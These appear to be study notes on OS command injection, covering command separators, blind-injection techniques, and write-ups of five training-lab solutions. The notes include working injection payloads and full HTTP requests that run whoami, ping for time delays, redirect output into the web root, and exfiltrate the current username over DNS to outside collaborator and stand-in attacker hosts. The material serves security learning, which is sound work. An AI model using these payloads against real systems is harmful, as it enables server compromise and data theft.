# OS Command Injection
OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data.

**Command separators:**
- Windows and Unix-based systems: `&`, `&&`, `|`, `||`
- Unix-based systems: `;`, `0x0a`, `\n`

## Blind OS command injection vulnerabilities
- **Detecting blind OS command injection using time delays:** use the ping command `ping -c 10 127.0.0.1 &`
- **Exploiting blind OS command injection by redirecting output:** redirect the output from the injected command into a file within the web root that we can retrieve: `& whoami > /var/www/static/whoami.txt &`
- **Exploiting blind OS command injection using out-of-band (OAST) techniques:** trigger out-of-band network interaction with a system that we controll using OAST techniques: `& nslookup $(whoami).kgji2ohoyw.web-attacker.com &`

### LAB: OS command injection, simple case
The vulnerability occurs in check stock function. Send this request to inject an OS command:

    POST /product/stock HTTP/2
    Host: 0ad9007f032f6b3d81687fa8009b00aa.web-security-academy.net

    productId=3&storeId=1+%26+whoami

### LAB: Blind OS command injection with time delays
The vulnerability occurs in the feedback function. Send this request to inject an OS command:

    POST /feedback/submit HTTP/2
    Host: 0a840059042358b7c2412ce700d80064.web-security-academy.net

    csrf=JDKzwkJjlmu2Yehyk2tmH7URgByH54Dn&name=asc&email=x@gmail.com||ping+-c10+127.0.0.1||&subject=c&message=asc

Notice the 10 seconds delay of the response indicating a successfull attack.

### LAB: Blind OS command injection with output redirection
The vulnerability occurs in the feedback function. Send this request to inject an OS command:

    POST /feedback/submit HTTP/2
    Host: 0a4900dc03776bb281eb9d90000b00fe.web-security-academy.net

    csrf=jpd639RM948HwQU9JITr18Tg4KrxnoYZ&name=pu&email=haha%40gmail.com||whoami>/var/www/images/exploit.txt||&subject=c&message=asc

This injection will redirect the output of the `whoami` command to `exploit.txt` which we can then view at `/image?filename=exploit.txt`.

### LAB: Blind OS command injection with out-of-band interaction
The vulnerability occurs in the feedback function. Send this request to inject an OS command:

    POST /feedback/submit HTTP/2
    Host: 0a340079033d2cea802c6c86008700d7.web-security-academy.net

    csrf=t623gozMKTxhBQvgg5sYHw4lqv1VF4oH&name=123&email=haha%40gmail.com||nslookup+2x0po963hafcq4b31orf9mxqchi86yun.oastify.com||&subject=asc&message=c

This injection will perform a DNS look up to the specified address. Notice the incoming DNS query at Burp's Collaborator.

### LAB: Blind OS command injection with out-of-band data exfiltration
The vulnerability occurs in the feedback function. Send this request to inject an OS command:

    POST /feedback/submit HTTP/2
    Host: 0a670032047167b381cb8efe00c600e1.web-security-academy.net

    csrf=CKySObjzzglqT3sMcFUFZblX7HfSLbTN&name=123&email=haha%40gmail.com||nslookup+$(whoami).unlhe1wv7254gw1vrgh7zeni2981wskh.oastify.com||&subject=asc&message=123

This injection will perform a DNS look up to the specified address with the value of the `whoami` command as the hostname. Notice the incoming DNS query at Burp's Collaborator containing the name of the current user. Submit it to solve the lab.

